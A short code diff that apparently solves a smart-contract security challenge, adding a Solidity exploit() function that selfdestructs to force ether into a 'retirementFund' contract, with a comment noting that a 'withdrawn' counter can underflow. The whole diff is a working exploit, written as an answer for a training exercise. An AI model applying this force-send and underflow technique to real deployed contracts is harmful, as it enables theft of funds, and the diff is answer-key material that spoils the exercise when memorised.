@@ -58,4 +58,8 @@ contract ExploitContract {
     }
 
     // write your exploit functions below
+    // @solution: withdrawn can underflow
+    function exploit() public {
+        selfdestruct(payable(address(retirementFund)));
+    }
 }
